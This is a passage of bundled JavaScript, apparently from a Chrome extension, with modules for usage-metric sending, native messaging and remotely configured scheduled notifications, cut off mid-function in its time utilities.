var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var DummyMetricSender = function () {
  function DummyMetricSender() {
    _classCallCheck(this, DummyMetricSender);
  }

  _createClass(DummyMetricSender, [{
    key: 'send',
    value: function send() {
      console.log('Dummy metric sender');
      return Promise.resolve(true);
    }
  }]);

  return DummyMetricSender;
}();

exports.default = DummyMetricSender;

},{}],68:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _dummyMetricSender = require('./dummy-metric-sender');

var _dummyMetricSender2 = _interopRequireDefault(_dummyMetricSender);

var _dailyMetricSender = require('./daily-metric-sender');

var _dailyMetricSender2 = _interopRequireDefault(_dailyMetricSender);

var _onceMetricSender = require('./once-metric-sender');

var _onceMetricSender2 = _interopRequireDefault(_onceMetricSender);

var _metricSender = require('./metric-sender');

var _metricSender2 = _interopRequireDefault(_metricSender);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

exports.default = { MetricSender: _metricSender2.default, DailyMetricSender: _dailyMetricSender2.default, OnceMetricSender: _onceMetricSender2.default, DummyMetricSender: _dummyMetricSender2.default };

},{"./daily-metric-sender":66,"./dummy-metric-sender":67,"./metric-sender":69,"./once-metric-sender":70}],69:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _paramUtils = require('../../utils/param-utils');

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var mappings = {
  day_num: 'DAYNUM',
  version: 'VERSION'
};

var MetricSender = function () {
  function MetricSender(baseUrl) {
    var baseParameters = arguments.length <= 1 || arguments[1] === undefined ? {} : arguments[1];
    var urlIsTemplate = arguments.length <= 2 || arguments[2] === undefined ? false : arguments[2];
    var sendCredentials = arguments.length <= 3 || arguments[3] === undefined ? false : arguments[3];

    _classCallCheck(this, MetricSender);

    this.__baseUrl = baseUrl;
    this.__baseParameters = baseParameters;
    this.__urlIsTemplate = urlIsTemplate;
    this.__sendCredentials = sendCredentials;
  }

  _createClass(MetricSender, [{
    key: 'send',
    value: function send() {
      var additionalParameters = arguments.length <= 0 || arguments[0] === undefined ? {} : arguments[0];

      var parameters = _extends({}, this.__baseParameters, additionalParameters);
      var url = this.__urlIsTemplate ? (0, _paramUtils.addParametersToUrlTemplate)((0, _paramUtils.normalizeUrlTemplate)(this.__baseUrl), (0, _paramUtils.createMapper)(mappings)(parameters)) : this.__baseUrl + '?' + (0, _paramUtils.convertParametersToQueryString)((0, _paramUtils.convertParametersToArray)(parameters));
      var options = this.__sendCredentials ? { credentials: 'include' } : {};
      return fetch(url, options).then(function () {
        return true;
      }).catch(function () {
        return false;
      });
    }
  }]);

  return MetricSender;
}();

exports.default = MetricSender;

},{"../../utils/param-utils":103}],70:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _get = function get(object, property, receiver) { if (object === null) object = Function.prototype; var desc = Object.getOwnPropertyDescriptor(object, property); if (desc === undefined) { var parent = Object.getPrototypeOf(object); if (parent === null) { return undefined; } else { return get(parent, property, receiver); } } else if ("value" in desc) { return desc.value; } else { var getter = desc.get; if (getter === undefined) { return undefined; } return getter.call(receiver); } };

var _statefulMetricSender = require('./stateful-metric-sender');

var _statefulMetricSender2 = _interopRequireDefault(_statefulMetricSender);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var OnceMetricSender = function (_StatefulMetricSender) {
  _inherits(OnceMetricSender, _StatefulMetricSender);

  function OnceMetricSender() {
    _classCallCheck(this, OnceMetricSender);

    return _possibleConstructorReturn(this, Object.getPrototypeOf(OnceMetricSender).apply(this, arguments));
  }

  _createClass(OnceMetricSender, [{
    key: 'send',
    value: function send(additionalParameters) {
      var _this2 = this;

      return _get(Object.getPrototypeOf(OnceMetricSender.prototype), 'send', this).call(this, additionalParameters).then(function (success) {
        return _this2.__setState({ wasSent: success });
      });
    }
  }, {
    key: 'shouldBeSent',
    value: function shouldBeSent() {
      return this.__getState().then(function (state) {
        return !state.wasSent;
      });
    }
  }, {
    key: '__getDefaultState',
    value: function __getDefaultState() {
      return Promise.resolve({ wasSent: false });
    }
  }]);

  return OnceMetricSender;
}(_statefulMetricSender2.default);

exports.default = OnceMetricSender;

},{"./stateful-metric-sender":71}],71:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _metricSender = require('./metric-sender');

var _metricSender2 = _interopRequireDefault(_metricSender);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var StatefulMetricSender = function (_MetricSender) {
  _inherits(StatefulMetricSender, _MetricSender);

  function StatefulMetricSender(baseUrl, parameters, urlIsTemplate, sendCredentials, stateStorage) {
    _classCallCheck(this, StatefulMetricSender);

    var _this = _possibleConstructorReturn(this, Object.getPrototypeOf(StatefulMetricSender).call(this, baseUrl, parameters, urlIsTemplate, sendCredentials));

    _this.__stateStorage = stateStorage;
    return _this;
  }

  _createClass(StatefulMetricSender, [{
    key: 'shouldBeSent',
    value: function shouldBeSent() {
      return Promise.reject('Method should be overridden');
    }
  }, {
    key: '__getState',
    value: function __getState() {
      var _this2 = this;

      return this.__stateStorage.getData().catch(function () {
        return _this2.__getDefaultState();
      });
    }
  }, {
    key: '__setState',
    value: function __setState(state) {
      return this.__stateStorage.setData(state);
    }
  }, {
    key: '__getDefaultState',
    value: function __getDefaultState() {
      return Promise.reject('Method should be overridden');
    }
  }]);

  return StatefulMetricSender;
}(_metricSender2.default);

exports.default = StatefulMetricSender;

},{"./metric-sender":69}],72:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
   value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _chromeUtils = require('../utils/chrome-utils');

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var namespace = chrome.runtime;

var NativeMessageSender = function () {
   function NativeMessageSender(host) {
      _classCallCheck(this, NativeMessageSender);

      this.__host = host;
   }

   _createClass(NativeMessageSender, [{
      key: 'sendNativeMessage',
      value: function sendNativeMessage(data) {
         return (0, _chromeUtils.wrapChromeApi)(namespace, 'sendNativeMessage', this.__host, data);

         /*const sampleResponse = JSON.parse(`
           {
              "install_id":"0516EC29E88B4736884143FEB69A5645",
              "mrds_parameters":[
                 {
                    "Id":"browser_class1",
                    "Value":true
                 },
                 {
                    "Id":"browser_class2",
                    "Value":false
                 },
                 {
                    "Id":"pa",
                    "Value":true
                 },
                 {
                    "Id":"pb",
                    "Value":true
                 },
                 {
                    "Id":"pd",
                    "Value":true
                 }
              ],
              "online_callback":"http://httpstat.us/200?0516EC29E88B4736884143FEB69A5645/0516EC29E88B4736884143FEB69A5645/1/zver/ch/1/0",
              "product_id":"{DC3EAB88-DB29-48E4-97E8-D3563C6955A1}",
              "rfr":"821716"
           }
         `);
           return Promise.resolve({
           Error: 0,
           InstallData: sampleResponse
         });*/
      }
   }]);

   return NativeMessageSender;
}();

exports.default = NativeMessageSender;

},{"../utils/chrome-utils":99}],73:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});
var NotificationEventTypes = {
  onClosed: 'onClosed',
  onClicked: 'onClicked',
  onButtonClicked: 'onButtonClicked'
};
exports.default = NotificationEventTypes;

},{}],74:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});
var NotificationScheduleTypes = {
  AFTER: 'after',
  URL: 'url',
  RANGE: 'range',
  DUMMY: 'dummy'
};
exports.default = NotificationScheduleTypes;

},{}],75:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _notificationBuilder = require('../notification-builder');

var _notificationBuilder2 = _interopRequireDefault(_notificationBuilder);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

var notificationFactory = function notificationFactory(_ref) {
  var notificationId = _ref.notificationId;
  var options = _ref.options;
  var onClicked = _ref.onClicked;
  var onButtonClicked = _ref.onButtonClicked;
  var onClosed = _ref.onClosed;

  var builder = new _notificationBuilder2.default();
  if (notificationId) {
    builder.setId(notificationId);
  }
  if (options) {
    builder.setOptions(options);
  }
  if (onClicked) {
    builder.setOnClicked(onClicked);
  }
  if (onButtonClicked) {
    builder.setOnButtonClicked(onButtonClicked);
  }
  if (onClosed) {
    builder.setOnClosed(onClosed);
  }
  return builder.build();
};

exports.default = notificationFactory;

},{"../notification-builder":77}],76:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});
exports.default = createNotificationSchedule;

var _notificationScheduleTypes = require('../constants/notification-schedule-types');

var _notificationScheduleTypes2 = _interopRequireDefault(_notificationScheduleTypes);

var _schedule = require('../schedule');

var _schedule2 = _interopRequireDefault(_schedule);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function createNotificationSchedule(_ref) {
  var type = _ref.type;
  var options = _ref.options;

  switch (type) {
    case _notificationScheduleTypes2.default.AFTER:
      return new _schedule2.default.AfterNotificationSchedule(options);
    case _notificationScheduleTypes2.default.RANGE:
      return new _schedule2.default.RangeNotificationSchedule(options);
    case _notificationScheduleTypes2.default.URL:
      return new _schedule2.default.UrlNotificationSchedule(options);
    default:
      return new _schedule2.default.DummyNotificationSchedule(options);
  }
}

},{"../constants/notification-schedule-types":74,"../schedule":88}],77:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _notificationEventTypes = require('./constants/notification-event-types');

var _notificationEventTypes2 = _interopRequireDefault(_notificationEventTypes);

var _notificationHandlerRegistry = require('./notification-handler-registry');

var _notificationHandlerRegistry2 = _interopRequireDefault(_notificationHandlerRegistry);

var _guid = require('../../utils/guid');

var _guid2 = _interopRequireDefault(_guid);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var NotificationBuilder = function () {
  function NotificationBuilder() {
    _classCallCheck(this, NotificationBuilder);

    this.__notificationId = (0, _guid2.default)();
    this.__baseOptions = {};
  }

  _createClass(NotificationBuilder, [{
    key: 'setId',
    value: function setId(notificationId) {
      this.__notificationId = notificationId;
      return this;
    }
  }, {
    key: 'setOptions',
    value: function setOptions(options) {
      this.__baseOptions = options;
      return this;
    }
  }, {
    key: 'setOnButtonClicked',
    value: function setOnButtonClicked(handler) {
      _notificationHandlerRegistry2.default.registerHandler(this.__notificationId, _notificationEventTypes2.default.onButtonClicked, handler);
      return this;
    }
  }, {
    key: 'setOnClicked',
    value: function setOnClicked(handler) {
      _notificationHandlerRegistry2.default.registerHandler(this.__notificationId, _notificationEventTypes2.default.onClicked, handler);
      return this;
    }
  }, {
    key: 'setOnClosed',
    value: function setOnClosed(handler) {
      _notificationHandlerRegistry2.default.registerHandler(this.__notificationId, _notificationEventTypes2.default.onClosed, handler);
      return this;
    }
  }, {
    key: 'build',
    value: function build() {
      return {
        id: this.__notificationId,
        options: this.__baseOptions
      };
    }
  }]);

  return NotificationBuilder;
}();

exports.default = NotificationBuilder;

},{"../../utils/guid":101,"./constants/notification-event-types":73,"./notification-handler-registry":80}],78:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _urlFetcher = require('../../common/url-fetcher');

var _urlFetcher2 = _interopRequireDefault(_urlFetcher);

var _notificationScheduleFactory = require('./factory/notification-schedule-factory');

var _notificationScheduleFactory2 = _interopRequireDefault(_notificationScheduleFactory);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var FetcherClass = (0, _urlFetcher.CredentialsMixin)(_urlFetcher2.default);

var NotificationConfigEntry = function () {
  function NotificationConfigEntry(_ref) {
    var confId = _ref.confId;
    var enabled = _ref.enabled;
    var schedule = _ref.schedule;
    var contentUrl = _ref.contentUrl;

    _classCallCheck(this, NotificationConfigEntry);

    this.__id = confId;
    this.__enabled = enabled;
    this.__schedule = (0, _notificationScheduleFactory2.default)(schedule);
    this.__contentFetcher = new FetcherClass(contentUrl + '?rnd=' + Date.now().toString());
  }

  _createClass(NotificationConfigEntry, [{
    key: 'getContent',
    value: function getContent() {
      return this.__contentFetcher.fetch().then(function (response) {
        return response.json();
      }).catch(function () {
        return null;
      });
    }
  }, {
    key: 'id',
    get: function get() {
      return this.__id;
    }
  }, {
    key: 'enabled',
    get: function get() {
      return this.__enabled;
    }
  }, {
    key: 'schedule',
    get: function get() {
      return this.__schedule;
    }
  }]);

  return NotificationConfigEntry;
}();

exports.default = NotificationConfigEntry;

},{"../../common/url-fetcher":46,"./factory/notification-schedule-factory":76}],79:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _notificationConfigEntry = require('./notification-config-entry');

var _notificationConfigEntry2 = _interopRequireDefault(_notificationConfigEntry);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

/*const DEMO_CONFIG = {
  notifications: [
    {
      conf_id: 'aaa',
      enabled: true,
      contentUrl: 'http://httpstat.us/200',
      schedule: {
        type: 'after',
        options: {
          count: 5,
          limit: '3m',
          after: '1m'
        }
      }
    },
    {
      conf_id: 'bbb',
      enabled: true,
      contentUrl: 'http://httpstat.us/200',
      schedule: {
        type: 'url',
        options: {
          count: 3,
          limit: '1d',
          urls: [
            'http://vk.com'
          ]
        }
      }
    },
    {
      conf_id: 'ccc',
      enabled: true,
      contentUrl: 'http://httpstat.us/200',
      schedule: {
        type: 'range',
        options: {
          count: 3,
          limit: '1m',
          ranges: [
            {
              startDate: '2016-07-11',
              endDate: '2016-07-15',
              startTime: '11:00',
              endTime: '20:59'
            }
          ]
        }
      }
    }
  ]
};*/

var NotificationConfigService = function () {
  function NotificationConfigService(slotFetcher) {
    _classCallCheck(this, NotificationConfigService);

    this.__fetcher = slotFetcher;
  }

  _createClass(NotificationConfigService, [{
    key: 'getConfig',
    value: function getConfig() {
      return this.__fetcher.fetch().then(function (response) {
        return response.json();
      }).then(function (_ref) {
        var notifications = _ref.notifications;
        return notifications.map(function (entry) {
          return new _notificationConfigEntry2.default(entry);
        });
      }).catch(function (err) {
        console.error(err);
        return [];
      });
    }
  }]);

  return NotificationConfigService;
}();

exports.default = NotificationConfigService;

},{"./notification-config-entry":78}],80:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _notificationEventTypes = require('./constants/notification-event-types');

var _notificationEventTypes2 = _interopRequireDefault(_notificationEventTypes);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var namespace = function namespace() {
  return chrome.notifications;
};

var NotificationHandlerRegistry = function () {
  function NotificationHandlerRegistry() {
    _classCallCheck(this, NotificationHandlerRegistry);

    this.__closedHandlers = new Map();
    this.__clickedHandlers = new Map();
    this.__buttonClickedHandlers = new Map();
  }

  _createClass(NotificationHandlerRegistry, [{
    key: 'init',
    value: function init() {
      var _this = this;

      namespace().onClicked.addListener(function (notificationId) {
        if (_this.__clickedHandlers.has(notificationId)) {
          _this.__clickedHandlers.get(notificationId)(notificationId);
        }
      });

      namespace().onButtonClicked.addListener(function (notificationId, buttonIndex) {
        if (_this.__buttonClickedHandlers.has(notificationId)) {
          _this.__buttonClickedHandlers.get(notificationId)(buttonIndex, notificationId);
        }
      });

      namespace().onClosed.addListener(function (notificationId, byUser) {
        if (_this.__closedHandlers.has(notificationId)) {
          _this.__closedHandlers.get(notificationId)(byUser, notificationId);
        }
      });
    }
  }, {
    key: 'registerHandler',
    value: function registerHandler(notificationId, event, handler) {
      this.__getMapByEvent(event).set(notificationId, handler);
    }
  }, {
    key: 'unregisterHandler',
    value: function unregisterHandler(notificationId, event) {
      var map = this.__getMapByEvent(event);
      if (map.has(notificationId)) {
        console.info('>> Has handler for ' + event + ', remove');
        map.delete(notificationId);
      }
    }
  }, {
    key: 'unregisterAllHandlers',
    value: function unregisterAllHandlers(notificationId) {
      var _this2 = this;

      Object.keys(_notificationEventTypes2.default).forEach(function (event) {
        return _this2.unregisterHandler(notificationId, event);
      });
    }
  }, {
    key: '__getMapByEvent',
    value: function __getMapByEvent(event) {
      switch (event) {
        case _notificationEventTypes2.default.onClosed:
          return this.__closedHandlers;
        case _notificationEventTypes2.default.onClicked:
          return this.__clickedHandlers;
        case _notificationEventTypes2.default.onButtonClicked:
          return this.__buttonClickedHandlers;
      }
    }
  }]);

  return NotificationHandlerRegistry;
}();

exports.default = new NotificationHandlerRegistry();

},{"./constants/notification-event-types":73}],81:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _notificationHistoryObject = require('./notification-history-object');

var _notificationHistoryObject2 = _interopRequireDefault(_notificationHistoryObject);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var NotificationHistoryManager = function () {
  function NotificationHistoryManager(notificationHistoryStorage) {
    _classCallCheck(this, NotificationHistoryManager);

    this.__notificationHistoryStorage = notificationHistoryStorage;
  }

  _createClass(NotificationHistoryManager, [{
    key: 'getNotificationHistory',
    value: function getNotificationHistory(notificationId) {
      return this.__loadData().then(function (history) {
        return history[notificationId];
      }).then(function (source) {
        return new _notificationHistoryObject2.default(source);
      });
    }
  }, {
    key: 'logNotificationDisplay',
    value: function logNotificationDisplay(notificationId) {
      var _this = this;

      return this.__loadData().then(function (history) {
        if (history.hasOwnProperty(notificationId)) {
          history[notificationId].lastDisplayDate = new Date();
          history[notificationId].displayCount += 1;
        } else {
          history[notificationId] = {
            lastDisplayDate: new Date(),
            displayCount: 1
          };
        }
        return _this.__saveData(history);
      });
    }
  }, {
    key: '__loadData',
    value: function __loadData() {
      return this.__notificationHistoryStorage.getData().catch(function () {
        return {};
      });
    }
  }, {
    key: '__saveData',
    value: function __saveData(value) {
      return this.__notificationHistoryStorage.setData(value);
    }
  }]);

  return NotificationHistoryManager;
}();

exports.default = NotificationHistoryManager;

},{"./notification-history-object":82}],82:[function(require,module,exports){
"use strict";

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var DEFAULT_HISTORY = { lastDisplayDate: new Date(0), displayCount: 0 };

var NotificationHistoryObject = function () {
  function NotificationHistoryObject() {
    var source = arguments.length <= 0 || arguments[0] === undefined ? DEFAULT_HISTORY : arguments[0];

    _classCallCheck(this, NotificationHistoryObject);

    this.__lastDisplayDate = new Date(source.lastDisplayDate);
    this.__displayCount = source.displayCount;
  }

  _createClass(NotificationHistoryObject, [{
    key: "lastDisplayDate",
    get: function get() {
      return this.__lastDisplayDate;
    }
  }, {
    key: "displayCount",
    get: function get() {
      return this.__displayCount;
    }
  }]);

  return NotificationHistoryObject;
}();

exports.default = NotificationHistoryObject;

},{}],83:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _chromeUtils = require('../../utils/chrome-utils');

var _notificationHandlerRegistry = require('./notification-handler-registry');

var _notificationHandlerRegistry2 = _interopRequireDefault(_notificationHandlerRegistry);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var namespace = function namespace() {
  return chrome.notifications;
};

var NotificationManager = function () {
  function NotificationManager() {
    _classCallCheck(this, NotificationManager);
  }

  _createClass(NotificationManager, [{
    key: 'getAllVisibleNotifications',
    value: function getAllVisibleNotifications() {
      return (0, _chromeUtils.wrapChromeApi)(namespace(), 'getAll');
    }
  }, {
    key: 'create',
    value: function create(notificationId, options) {
      return (0, _chromeUtils.wrapChromeApi)(namespace(), 'create', notificationId, options);
    }
  }, {
    key: 'update',
    value: function update(notificationId, options) {
      return (0, _chromeUtils.wrapChromeApi)(namespace(), 'update', notificationId, options);
    }
  }, {
    key: 'clear',
    value: function clear(notificationId) {
      return (0, _chromeUtils.wrapChromeApi)(namespace(), 'clear', notificationId);
    }
  }, {
    key: 'destroy',
    value: function destroy(notificationId) {
      _notificationHandlerRegistry2.default.unregisterAllHandlers(notificationId);
      return this.clear(notificationId);
    }
  }]);

  return NotificationManager;
}();

exports.default = new NotificationManager();

},{"../../utils/chrome-utils":99,"./notification-handler-registry":80}],84:[function(require,module,exports){
'use strict';

Object.defineProperty(exports, "__esModule", {
  value: true
});

var _slicedToArray = function () { function sliceIterator(arr, i) { var _arr = []; var _n = true; var _d = false; var _e = undefined; try { for (var _i = arr[Symbol.iterator](), _s; !(_n = (_s = _i.next()).done); _n = true) { _arr.push(_s.value); if (i && _arr.length === i) break; } } catch (err) { _d = true; _e = err; } finally { try { if (!_n && _i["return"]) _i["return"](); } finally { if (_d) throw _e; } } return _arr; } return function (arr, i) { if (Array.isArray(arr)) { return arr; } else if (Symbol.iterator in Object(arr)) { return sliceIterator(arr, i); } else { throw new TypeError("Invalid attempt to destructure non-iterable instance"); } }; }();

exports.parseTime = parseTime;
exports.parseInterval = parseInterval;
exports.addTime = addTime;
exports.calculateIntervalInMilliseconds = calculateIntervalInMilliseconds;
function parseTime(when) {
  var TIME_PATTERN = /([0-2]{0,1}[0-9]{1}):([0-5]{0,1}[0-9]{1})/gi;

  var _TIME_PATTERN$exec$sl = TIME_PATTERN.exec(when).slice(1).map(function (i) {
    return parseInt(i, 10);
  });

  var _TIME_PATTERN$exec$sl2 = _slicedToArray(_TIME_PATTERN$exec$sl, 2);

  var hours = _TIME_PATTERN$exec$sl2[0];
  var minutes = _TIME_PATTERN$exec$sl2[1];

  return { hours: hours, minutes: minutes };
}

function parseInterval(intervalStr) {
  var INTERVAL_PATTERN = /(\d{1,2})([s,m,h,d,w]{1})/gi;

  var _INTERVAL_PATTERN$exe = INTERVAL_PATTERN.exec(intervalStr);

  var _INTERVAL_PATTERN$exe2 = _slicedToArray(_INTERVAL_PATTERN$exe, 3);

  var countStr = _INTERVAL_PATTERN$exe2[1];
  var units = _INTERVAL_PATTERN$exe2[2];

  var count = parseInt(countStr, 10);
  return { count: count, units: units };
}

function addTime(date, _ref) {
  var units = _ref.units;
  var count = _ref.count;

  var clone = new Date(date.getTime());
  switch (units) {
    case 's':
      clone.setSeconds(clone.getSeconds() + count);
      break;
    case 'm':
      clone.setMinutes(clone.getMinutes() + count);
      break;
    case 'h':
      clone.setHours(clone.getHours() + count);
      break;
    case 'd':
      clone.setDate(clone.getDate() + count);
      break;
    case 'w':
      clone.setDate(clone.getDate() + count * 7);
      break;
  }
  return clone;
}

function calculateIntervalInMilliseconds(_ref2) {
  var units = _ref2.units;
  var count = _ref2.count;

  var result = count;
  switch (units) {
    case 'w':
      result *= 7;
    case 'd':
      result *= 24;
    case 'h':
      result *= 60;
    case 'm':
